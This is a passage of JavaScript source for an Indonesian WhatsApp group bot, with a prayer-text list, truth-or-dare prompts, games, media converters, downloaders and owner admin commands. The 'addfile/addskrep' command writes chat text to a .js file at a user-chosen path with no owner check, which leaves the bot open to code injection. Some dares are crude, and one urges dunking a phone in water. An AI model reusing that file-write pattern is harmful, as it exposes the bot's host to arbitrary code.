 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
},
{
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
},
{
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
},
{
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
},
{
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
}
]
}
let bacaan = JSON.stringify(bacaanshalat)
let json = JSON.parse(bacaan)
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
let contoh = `*${Kyuu}「 Bacaan Shalat 」${Kyuu}*\n\n`
zreply(`${contoh} + ${data}`)
uselimit()
}
break
        
case 'truth':
if (limitnya < 1) return zreply(mess.limit)
const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'siapa first lovemu', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
reply (`${ttrth}`) 
uselimit()
break

case 'dare':
if (limitnya < 1) return zreply(mess.limit)
const dare = ['Foto kuburan tengah malam berani ga?', 'Ambil foto bot, jadikan foto profil kamu selama 1 hari', 'VN nyanyi balonku ada 5', 'Minum Coca-Cola sampai habis tanpa sendawa selama 30 detik', 'Makan 1 Cabe tanpa minum, tanpa gorengan selama 2 menit', 'Celupin hp kamu ke air selama 30 detik', 'VN *Aku sayang kamu*', 'Nyanyi potong bebek angsa (VN)', 'Kirim pesan ke mantan kamu dan bilang _aku masih suka sama kamu_', 'Telfon crush/pacar sekarang dan ss ke pemain','Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'push up 10x terus di video in', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'sebutkan nama nama mantan mu *max 3 aja*', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
reply (`${der}`)
uselimit()
break

case 'gantengcek':
case 'cekganteng':{
if (limitnya < 1) return zreply(mess.limit)
if (!q) return reply(`*Example*: ${prefix + command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}%`)
uselimit()
}
break 
        
case 'cantikcek':
case 'cekcantik':{
if (limitnya < 1) return zreply(mess.limit)
if (!q) return reply(`*Example*: ${prefix + command} Akame`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}%`)
uselimit()
}
break
        
case 'kuismath':
case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!");
let { genMath, modes } = require('./lib/math.js');
if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh _useran: ${prefix}math medium`);
let result = await genMath(text.toLowerCase());
ZetInc.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban;
});
await sleep(result.waktu);
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]]);
delete kuismath[m.sender.split('@')[0]];
}
}
break;
        
case 'tictactoe': case 'ttt': case 'ttc': case 'xox':
if (!m.isGroup) return reply(mess.group)
if (from in tictactoe) return reply(`Masih ada game yang blum selesai`)
if (!froms) return reply(`Kirim perintah *${command}* @tag atau reply pesan orangnya!`)
if (froms === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply(`Sad amat main ama diri sendiri`)
var hadiah = randomInt(10, 20)
await reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain TicTacToe\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${hadiah} balance`)
tictactoe[from] = {
id: from,
status: null,
hadiah: hadiah,
penantang: sender,
ditantang: froms,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
}
break
        
case 'delttt': case 'delttc':
if (!m.isGroup) return reply(mess.group)
if (!(from in tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
if (isAdmins || isCreator) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].penantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].ditantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else {
reply(`Anda tidak bisa menghapus sesi tictactoe karena bukan pemain!`)
}
break
        
case 'getcase': {
const getCase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync("./message.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
try{
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`contoh : ${prefix + command} antilink`)
let nana = await getCase(q)
reply(nana)
} catch(err){
console.log(err)
reply(`Case ${q} tidak di temukan`)
}
}
break

case 'delcase': {
if (!isCreator) return reply(mess.owner)
if (!q) return reply('*Masukan nama case yang akan di hapus*')
dellCase('./message.js', q)
reply('*Dellcase Successfully*')
}
break

case 'toaudio': case 'tomp3':{
if (limitnya < 1) return zreply(mess.limit)
addCountCmd('#tomp3', m.sender, _cmd)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply (`reply video/vn dengan caption ${prefix + command}`)
if (!quoted) return reply(`reply video/vn dengan caption ${prefix + command}`)
reply(mess.bugrespon)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
ZetInc.sendMessage(m.chat, {audio, mimetype: 'audio/mpeg'}, { quoted : m })
uselimit()
}
break

case 'tovn': {
if (limitnya < 1) return zreply(mess.limit)
addCountCmd('#tovn', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`reply video/vn dengan caption ${prefix + command}`)
if (!quoted) return reply(`reply video/vn dengan caption ${prefix + command}`)
reply(mess.bugrespon)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
ZetInc.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
uselimit()
}
break

case 'toimage': case 'toimg': {
if (limitnya < 1) return zreply(mess.limit)
addCountCmd('#toimage', m.sender, _cmd)
if (!quoted) return reply(`reply sticker dengan caption ${prefix + command}`)
if (!/webp/.test(mime)) return reply(`reply sticker dengan caption ${prefix + command}`)
reply(mess.bugrespon)
let media = await ZetInc.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
ZetInc.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
uselimit()
}
break

case"addfl":
case"addfile":
case"addskrep":{
if (!text) return reply(`*Example*: ${prefix + command} menu`)
try {
if (!m.quoted.text) return reply(`Reply Code Message!`)
let path = `./${text}.js`
await fs.writeFileSync(path, m.quoted.text)
reply(`Saved in ${path}`)
} catch (error) {
console.log(error)
reply("Reply Code Message!")
}}
break

case 'ig': {
if (limitnya < 1) return zreply(mess.limit)
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
let ig = await fetchJson(`https://api.kyuurzy.site/api/download/igdl?query=${text}`)
let url = ig.result.media
if (!url.length == 1) {
if (m.isGroup) { ig.result.media.forEach(async (k) => {
await ZetInc.sendMessage(m.sender, { image: { url: k }}, {quoted: m});
})

zreply(`All photos have been sent to your private chat`)
} else { ig.result.media.forEach(async (k) => {
await ZetInc.sendMessage(from, { image: { url: k }}, { quoted: m });
})
}

} else { ZetInc.sendMessage(m.chat, { video: { url: ig.result.media[0]},caption: mess.done },{ quoted: m })
}
uselimit()
}
break
        
case 'tiktok': case 'tt': {
if (limitnya < 1) return zreply(mess.limit)
if (!text) return zreply(`Enter the TikTok link`)
//if (!text.match(/(https:\/\/tiktok.com\/)/gi)) return reply(`invalid link`)
let tt = await fetchJson(`https://api.kyuurzy.site/api/download/tiktok?query=${text}`)
let res = tt.result
let cap = `${res.title}`
ZetInc.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: cap }, { quoted: m })
uselimit()
}
break

case'thanksto':
case'tqto':{
let tekk = `Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} Here are some people who have helped in the development of this script

* KyuuSenpaiii ( Creator/Owner )
* zetsuboxygen ( Penyuka Burassa )
* GhostXdzz ( Support )
* iPutu ( Penyedia Base )
* Rull2nd ( Support )
* All Member *1S Universe*
* All Member *SSA - Team*

To them, I say thank you very much, without them the script would be nothing\n`
ZetInc.sendMessage(m.chat, {
text: tekk,
contextInfo: {
mentionedJid: [m.sender],
isForwarded: true,
externalAdReply: {
title: `© Thanks To - Participate`,
body: `Thanks For`,
thumbnailUrl: "https://telegra.ph/file/889d17c606f2a4be8481e.jpg",
sourceUrl: `https://kyuurzy.site`,
mediaType: 1,
showAdtibution: true,
renderLargerThumbnail: true
}}}, {quoted:m})}
break     

case 'getskrep': {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`Add Input, Example: *${prefix + command} ryocakep*`)
let pluginsDirect = path.resolve(__dirname, './lib')
let plugin = loadPlugins(pluginsDirect).find(p => p.command.includes(q)) // Perubahan disini
if (!plugin) return reply(`Plugin dengan command '${q}' tidak ditemukan.`)
await ZetInc.sendMessage(m.chat, {
document: fs.readFileSync(plugin.filePath),
fileName: path.basename(plugin.filePath),
mimetype: '*/*'
}, {
quoted: m
})
await reply(`Succes mengambil plugin '${q}', plugin telah dikirim.`)
}
break

case'sc':
case'script':{
replysc(`to get this script
You just need to buy it
*with price :*
* IDN = Rp. 70,000 -
* Eng = $ 4,41 -
 Click the URL below to contact the owner.`)
}
break

case'link':{
if (args[0] === "gc") {
if (!isGroup) return reply(mess.group)
const code = await ZetInc.groupInviteCode(m.chat)
const baten = new Button();
let ads = baten.setBody("Link Group");
ads += baten.addCopy("Tap Here", 'https://chat.whatsapp.com/'+code);
ads += baten.run(m.chat, ZetInc, m);
} if (args[0] === "ch") {
const baten = new Button()
let ads = baten.setBody("Link Channel");
ads += baten.addCopy("Tap Here", `${global.channel}`);
ads += baten.run(m.chat, ZetInc, m);
}}
break
        
case 'addcase': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply('Mana case nya');
const fs = require('fs');
const namaFile = 'message.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return;
}
const posisiAwalGimage = data.indexOf("case 'addcase':");

if (posisiAwalGimage !== -1) {
const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
reply('Terjadi kesalahan saat menulis file:', err);
} else {
reply('Case baru berhasil ditambahkan.');
}
});
} else {
reply('Tidak dapat menambahkan case dalam file.');
}
});
}
break

case 'public': {
if (!isCreator) return reply(mess.owner) 
ZetInc.public = true
reply('_Sukse Change To Public_')
}
break

case 'self': {
if (!isCreator) return reply(mess.owner) 
ZetInc.public = false
reply('_Sukses Change To Self_')
}
break

case'ping':
case'info':{ 
const start = performance.now();
const cpus = os.cpus();
const uptimeSeconds = os.uptime();
const uptimeDays = Math.floor(uptimeSeconds / 86400);
const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
const uptimeSecs = Math.floor(uptimeSeconds % 60);
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const muptime = runtime(process.uptime()).trim()
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
const speed = (performance.now() - start).toFixed(3);

const serverInfo = `Server Information:\n
- CPU Cores: ${cpus.length}
- CPU Model: ${cpus[0].model}
- Platform: ${os.platform()}
- Architecture: ${os.arch()}
- Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s
- RAM: ${formattedUsedMem} / ${formattedTotalMem}
- Load Average (1, 5, 15 min): ${loadAverage}
- Response Time: ${speed} seconds
- Total Features: ${totalFitur()} Feature
- Runtime: ${muptime}
- Type: case x plugin
`.trim();

ZetInc.reply(m.chat, serverInfo, m);
}
break

case 'totalfitur':{
let kontol = `*TOTAL FITUR SAAT INI*\n> ${totalFitur()} *Feature*\n\n*NOTE* :\n> If you want to request a feature for owners, you can directly chat privately`
zreply(kontol)}
break
                
case'banchat':{
if (!isCreator) return reply(mess.owner)
if (global.db.data.chats[m?.chat].isBanned = true) return m?.reply("Sudah Active")
global.db.data.chats[m?.chat].isBanned = true
m?.reply("berhasil banchat")
}
break

case'unbanchat':{
if (!isCreator) return reply(mess.owner)
if (global.db.data.chats[m?.chat].isBanned = false) return m?.reply("Sudah Off")
global.db.data.chats[m?.chat].isBanned = false
m?.reply("berhasil unbanchat")
}
break
        
case 'listpc': {
if (!isCreator) return reply(mess.owner)
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${nama}\n*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
ZetInc.sendTextWithMentions(m.chat, teks, m)
}
break

case 'restart':
if (!isCreator) return reply(mess.owner)
await zreply('Restart...')
process.exit()
break
        
case "backup":{
if (!isCreator) return reply(mess.owner);
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await ZetInc.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break
        
case 'closetime':
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.Badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else { return reply("*pilih Opsi Di Bawah Ini:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 zreply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
ZetInc.groupSettingUpdate(from, 'announcement')
 zreply(close)
}, timer)
break

case 'opentime':
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.Badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return zreply("*pilih Opsi Di Bawah Ini:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 zreply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
ZetInc.groupSettingUpdate(from, 'not_announcement')
 zreply(open)
}, timer)
break

case'getfile':
case'gf':{
//if (ZetInc.user.jid !== global.ZetInc.user.jid) return
  if (!isCreator) return reply(mess.owner)
  if (!text) return ZetInc.reply(m.chat, `*Example:* ${prefix + command} config`, m)
  let fileName = text.trim().toLowerCase()
  let filePath = path.join(__dirname, '.', fileName + '.js')
  if (!fs.existsSync(filePath)) {
    return ZetInc.reply(m.chat, `The file ${fileName}.js does not exist!`, m)
  }

  let fileContent = fs.readFileSync(filePath, 'utf-8')
  ZetInc.reply(m.chat, fileContent, m)
}
break
        
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
if (limitnya < 1) return zreply(mess.limit)
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await ZetInc.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
ZetInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Reply Audio Format:  *${prefix + command}*`)
} catch (e) {
reply(e)
}
uselimit()
break
     
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (limitnya < 1) return zreply(mess.limit)
if (!q) return reply(`Example : ${prefix + command} KyuuRzy`) 
reply(mess.bugrespon)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
